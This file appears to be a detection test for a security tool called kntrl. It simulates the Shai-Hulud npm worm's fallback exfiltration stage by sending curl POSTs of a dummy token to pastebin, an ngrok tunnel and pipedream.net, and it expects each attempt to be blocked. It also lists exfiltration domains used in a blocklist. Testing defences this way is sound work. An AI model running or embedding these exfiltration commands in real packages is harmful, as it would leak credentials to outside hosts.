/**
 * Stage 3 — Exfiltration to pastebin.com
 *
 * When webhook.site is unreachable, Shai-Hulud falls back to pastebin
 * and other paste services. The worm also uses ngrok tunnels and
 * pipedream.net as alternate C2 channels.
 *
 * kntrl detection:
 *   - Rego rule 1: blocks pastebin.com, ngrok.io, pipedream.net (exfil domain blocklist)
 *   - YAML blocked_chains: blocks curl from npm ancestry
 */

const { execSync } = require("child_process");

const targets = [
  { url: "https://pastebin.com/api/api_post.php", name: "pastebin.com" },
  { url: "https://abc123.ngrok-free.app/exfil",   name: "ngrok tunnel" },
  { url: "https://eo123.m.pipedream.net",          name: "pipedream.net" },
];

for (const target of targets) {
  console.log(`  [exfil] Attempting fallback exfil via curl → ${target.name} ...`);
  try {
    execSync(
      `curl -s -m 5 -X POST -d "data=simulated_token" ${target.url}`,
      { stdio: "inherit", timeout: 8000 }
    );
    console.log(`  [exfil] WARNING: curl to ${target.name} succeeded (should be blocked!)`);
  } catch (err) {
    if (err.signal === "SIGKILL") {
      console.log(`  [exfil] curl killed by kntrl (SIGKILL) — blocked before connect`);
    } else {
      console.log(`  [exfil] curl to ${target.name} blocked or failed — expected`);
    }
  }
}
